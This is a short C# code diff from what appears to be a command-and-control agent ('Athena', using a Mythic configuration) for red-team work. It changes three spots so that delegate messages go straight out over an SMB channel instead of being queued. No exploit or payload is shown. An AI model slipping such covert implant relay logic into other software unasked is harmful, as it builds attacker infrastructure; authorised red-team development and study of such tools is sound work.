@@ -92,7 +92,7 @@ namespace Athena
                     {
                         foreach(var del in gtr.delegates)
                         {
-                            Globals.mc.MythicConfig.smbConfig.AddToQueue(del);
+                            Globals.mc.MythicConfig.smbConfig.Send(del);
                         }
                     }
                     return gtr.tasks;
@@ -321,7 +321,7 @@ namespace Athena
                         {
                             foreach (var del in cs.delegates)
                             {
-                                Globals.mc.MythicConfig.smbConfig.AddToQueue(del);
+                                Globals.mc.MythicConfig.smbConfig.Send(del);
                             }
                         }
                         //Pass up socks messages
@@ -400,7 +400,7 @@ namespace Athena
                     {
                         foreach (var del in cs.delegates)
                         {
-                            Globals.mc.MythicConfig.smbConfig.AddToQueue(del);
+                            Globals.mc.MythicConfig.smbConfig.Send(del);
                         }
                     }
 
